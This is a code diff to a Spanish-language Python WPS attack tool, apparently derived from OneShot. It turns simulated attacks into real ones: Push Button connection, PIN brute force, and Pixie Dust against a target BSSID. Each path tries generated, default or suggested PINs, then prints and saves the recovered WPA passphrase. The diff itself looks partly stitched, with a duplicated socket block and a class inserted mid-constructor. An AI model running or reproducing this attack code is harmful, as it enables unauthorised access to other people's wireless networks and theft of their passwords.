@@ -510,6 +510,14 @@ class AdvancedWPSAttacks:
                 log_message(f"¡State Confusion exitosa!", "SUCCESS", preview_mode=True)
                 return True
         
+        return False
+
+
+class Companion:
+    """Clase principal para ataques WPS con funcionalidad completa"""
+    
+    def __init__(self, interface, bssid=None, print_debug=False):
+        self.interface = interface
         self.print_debug = print_debug
 
         self.tempdir = tempfile.mkdtemp()
@@ -518,6 +526,24 @@ class AdvancedWPSAttacks:
             self.tempconf = temp.name
         self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
         self.__init_wpa_supplicant()
+
+        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
+        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+        self.retsock.bind(self.res_socket_file)
+
+        self.pixie_creds = PixiewpsData()
+        self.connection_status = ConnectionStatus()
+
+        user_home = str(pathlib.Path.home())
+        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
+        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
+        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+        if not os.path.exists(self.sessions_dir):
+            os.makedirs(self.sessions_dir)
+        if not os.path.exists(self.pixiewps_dir):
+            os.makedirs(self.pixiewps_dir)
+
+        self.generator = WPSpin()
 
         self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
         self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
@@ -2049,12 +2075,62 @@ if __name__ == '__main__':
                         break
                 
                 log_message("Creando sistema de ataque WPS...", "DEBUG")
-                # Crear una instancia simple para ataques WPS
-                companion = None  # Placeholder por ahora
+                # Crear instancia real de Companion para ataques WPS
+                companion = Companion(args.interface, print_debug=args.verbose)
                 
                 if args.pbc:
-                    log_message("Iniciando conexión WPS Push Button...", "INFO")
-                    log_message("Modo PBC simulado - funcionalidad básica", "INFO")
+                    log_message("Iniciando conexión WPS Push Button avanzada...", "INFO")
+                    
+                    # Configurar BSSID para PBC si está disponible
+                    target_bssid = getattr(args, 'bssid', None)
+                    if target_bssid:
+                        log_message(f"Modo PBC dirigido hacia: {target_bssid}", "INFO")
+                    else:
+                        log_message("Modo PBC general (cualquier AP disponible)", "INFO")
+                    
+                    # Ejecutar ataque PBC real con manejo avanzado
+                    log_message("Esperando que presiones el botón WPS en el router...", "INFO")
+                    log_message("Tienes aproximadamente 2 minutos para presionar el botón", "INFO")
+                    
+                    try:
+                        result = companion.single_connection(
+                            bssid=target_bssid,
+                            pbc_mode=True,
+                            store_pin_on_fail=False
+                        )
+                        
+                        if result and companion.connection_status.status == 'GOT_PSK':
+                            log_message("¡CONEXIÓN PBC EXITOSA!", "SUCCESS")
+                            log_message(f"BSSID conectado: {companion.connection_status.bssid or target_bssid}", "SUCCESS")
+                            log_message(f"ESSID: {companion.connection_status.essid}", "SUCCESS")
+                            log_message(f"WPA PSK: {companion.connection_status.wpa_psk}", "SUCCESS")
+                            
+                            # Guardar resultado PBC
+                            companion._Companion__saveResult(
+                                companion.connection_status.bssid or target_bssid or 'PBC_UNKNOWN',
+                                companion.connection_status.essid,
+                                '<PBC mode>',
+                                companion.connection_status.wpa_psk
+                            )
+                            
+                            # Mostrar credenciales
+                            companion._Companion__credentialPrint(
+                                wps_pin='<PBC mode>',
+                                wpa_psk=companion.connection_status.wpa_psk,
+                                essid=companion.connection_status.essid
+                            )
+                        else:
+                            log_message("Conexión PBC no tuvo éxito", "WARNING")
+                            log_message("Posibles causas:", "INFO")
+                            log_message("- No se presionó el botón WPS a tiempo", "INFO")
+                            log_message("- El router no soporta WPS o está deshabilitado", "INFO")
+                            log_message("- Interferencia o problemas de señal", "INFO")
+                    
+                    except Exception as pbc_error:
+                        log_message(f"Error en modo PBC: {pbc_error}", "ERROR")
+                        if args.verbose:
+                            import traceback
+                            log_message(f"Traceback PBC: {traceback.format_exc()}", "DEBUG")
                 else:
                     if not args.bssid:
                         # Cargar lista de dispositivos vulnerables
@@ -2092,21 +2168,145 @@ if __name__ == '__main__':
                     log_message(f"Iniciando ataque contra {args.bssid}", "INFO")
                     
                     try:
-                        log_message("Iniciando ataque WPS básico...", "DEBUG")
+                        # Crear instancia de Companion para el BSSID específico
+                        companion = Companion(args.interface, bssid=args.bssid, print_debug=args.verbose)
                         
                         if args.bruteforce:
-                            log_message("Modo: Fuerza bruta", "INFO")
-                            log_message(f"Simulando fuerza bruta contra {args.bssid}", "BRUTE")
-                            # Aquí iría la lógica de fuerza bruta
-                            log_message("Fuerza bruta completada (simulación)", "INFO")
+                            log_message("Modo: Fuerza bruta WPS avanzada", "INFO")
+                            log_message(f"Ejecutando fuerza bruta inteligente contra {args.bssid}", "BRUTE")
+                            
+                            # Configurar parámetros de fuerza bruta
+                            start_pin = None
+                            if hasattr(args, 'start_pin') and args.start_pin:
+                                start_pin = str(args.start_pin).zfill(4)
+                                log_message(f"PIN inicial personalizado: {start_pin}", "DEBUG")
+                            
+                            delay = getattr(args, 'delay', 1)  # Delay entre intentos
+                            log_message(f"Delay entre intentos: {delay}s", "DEBUG")
+                            
+                            # Ataque de fuerza bruta inteligente real
+                            result = companion.smart_bruteforce(
+                                bssid=args.bssid,
+                                start_pin=start_pin,
+                                delay=delay
+                            )
+                            
+                            if result:
+                                log_message(f"¡FUERZA BRUTA EXITOSA! PIN encontrado: {result}", "SUCCESS")
+                                log_message(f"ESSID: {companion.connection_status.essid}", "SUCCESS")
+                                log_message(f"WPA PSK: {companion.connection_status.wpa_psk}", "SUCCESS")
+                                
+                                # Guardar resultado en archivos
+                                companion._Companion__saveResult(
+                                    args.bssid, 
+                                    companion.connection_status.essid, 
+                                    result, 
+                                    companion.connection_status.wpa_psk
+                                )
+                                
+                                # Mostrar credenciales de forma elegante
+                                companion._Companion__credentialPrint(
+                                    wps_pin=result,
+                                    wpa_psk=companion.connection_status.wpa_psk,
+                                    essid=companion.connection_status.essid
+                                )
+                            else:
+                                log_message("Fuerza bruta completada sin éxito", "WARNING")
+                                log_message("Intentando con PINs alternativos...", "INFO")
+                                
+                                # Intentar con PINs sugeridos como fallback
+                                suggested_pins = companion.generator.getSuggestedList(args.bssid)
+                                for pin in suggested_pins[:5]:  # Probar los 5 más probables
+                                    log_message(f"Probando PIN sugerido: {pin}", "PIN")
+                                    if companion.single_connection(bssid=args.bssid, pin=pin):
+                                        log_message(f"¡PIN SUGERIDO EXITOSO! PIN: {pin}", "SUCCESS")
+                                        break
                         else:
-                            log_message("Modo: Conexión única (Pixie Dust)", "INFO")
-                            log_message(f"Simulando Pixie Dust contra {args.bssid}", "PIXIE")
-                            # Aquí iría la lógica de Pixie Dust
-                            log_message("Pixie Dust completado (simulación)", "INFO")
+                            log_message("Modo: Ataque WPS avanzado (Pixie Dust + PIN inteligente)", "INFO")
+                            log_message(f"Ejecutando ataque Pixie Dust avanzado contra {args.bssid}", "PIXIE")
+                            
+                            # Determinar PIN a usar
+                            target_pin = None
+                            if hasattr(args, 'pin') and args.pin:
+                                target_pin = args.pin
+                                log_message(f"Usando PIN especificado: {target_pin}", "PIN")
+                            else:
+                                # Generar PIN inteligente basado en BSSID
+                                likely_pin = companion.generator.getLikely(args.bssid)
+                                if likely_pin:
+                                    target_pin = likely_pin
+                                    log_message(f"PIN probable generado: {target_pin}", "PIN")
+                                else:
+                                    target_pin = '12345670'  # PIN por defecto
+                                    log_message(f"Usando PIN por defecto: {target_pin}", "PIN")
+                            
+                            # Configurar opciones avanzadas
+                            show_pixie_cmd = getattr(args, 'showpixiecmd', False) or args.verbose
+                            pixie_force = getattr(args, 'pixieforce', False)
+                            
+                            log_message(f"Opciones: showpixiecmd={show_pixie_cmd}, pixieforce={pixie_force}", "DEBUG")
+                            
+                            # Ataque Pixie Dust avanzado real
+                            result = companion.single_connection(
+                                bssid=args.bssid,
+                                pin=target_pin,
+                                pixiemode=True,
+                                showpixiecmd=show_pixie_cmd,
+                                pixieforce=pixie_force,
+                                store_pin_on_fail=True
+                            )
+                            
+                            if result:
+                                log_message(f"¡PIXIE DUST EXITOSO! Credenciales obtenidas", "SUCCESS")
+                                
+                                # Mostrar información detallada del éxito
+                                if companion.connection_status.status == 'GOT_PSK':
+                                    log_message(f"Estado: {companion.connection_status.status}", "SUCCESS")
+                                    log_message(f"ESSID: {companion.connection_status.essid}", "SUCCESS")
+                                    log_message(f"WPA PSK: {companion.connection_status.wpa_psk}", "SUCCESS")
+                                    
+                                    # Guardar resultado
+                                    companion._Companion__saveResult(
+                                        args.bssid,
+                                        companion.connection_status.essid,
+                                        target_pin,
+                                        companion.connection_status.wpa_psk
+                                    )
+                                    
+                                    # Mostrar credenciales elegantemente
+                                    companion._Companion__credentialPrint(
+                                        wps_pin=target_pin,
+                                        wpa_psk=companion.connection_status.wpa_psk,
+                                        essid=companion.connection_status.essid
+                                    )
+                                else:
+                                    log_message(f"Conexión establecida pero estado: {companion.connection_status.status}", "INFO")
+                            else:
+                                log_message("Pixie Dust no tuvo éxito, probando métodos alternativos...", "WARNING")
+                                
+                                # Fallback: Probar con PINs sugeridos
+                                log_message("Intentando con PINs sugeridos para este BSSID...", "INFO")
+                                suggested_pins = companion.generator.getSuggestedList(args.bssid)
+                                
+                                for i, pin in enumerate(suggested_pins[:3]):  # Probar los 3 más probables
+                                    log_message(f"Probando PIN sugerido {i+1}/3: {pin}", "PIN")
+                                    if companion.single_connection(bssid=args.bssid, pin=pin, pixiemode=False):
+                                        log_message(f"¡PIN SUGERIDO EXITOSO! PIN: {pin}", "SUCCESS")
+                                        companion._Companion__credentialPrint(
+                                            wps_pin=pin,
+                                            wpa_psk=companion.connection_status.wpa_psk,
+                                            essid=companion.connection_status.essid
+                                        )
+                                        break
+                                    time.sleep(1)  # Pequeño delay entre intentos
+                                else:
+                                    log_message("Todos los métodos fallaron para este objetivo", "WARNING")
                     
                     except Exception as e:
                         log_message(f"Error durante el ataque: {e}", "ERROR")
+                        if args.verbose:
+                            import traceback
+                            log_message(f"Traceback: {traceback.format_exc()}", "DEBUG")
                         if args.loop:
                             log_message("Continuando con siguiente objetivo...", "INFO")
                         else:
